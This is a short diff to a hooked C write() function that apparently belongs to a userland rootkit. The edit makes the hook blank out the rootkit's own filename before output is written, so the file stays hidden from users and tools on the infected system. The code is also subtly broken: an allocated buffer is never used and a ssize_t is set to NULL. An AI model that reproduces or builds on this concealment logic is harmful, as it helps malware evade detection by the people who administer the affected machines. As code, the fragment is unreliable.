@@ -47,9 +47,9 @@ ssize_t write(int fd, const void *buf, size_t bytes)
 
     if (rootkit_found != NULL)
     {
-        int len = strlen(FILENAME);
+        size_t len = strlen(FILENAME);
         char *new_output = (char*) malloc(strlen(buf) - len);
-        
+        memset(rootkit_found, 0, len);
     }
 
     ssize_t write_output = NULL;
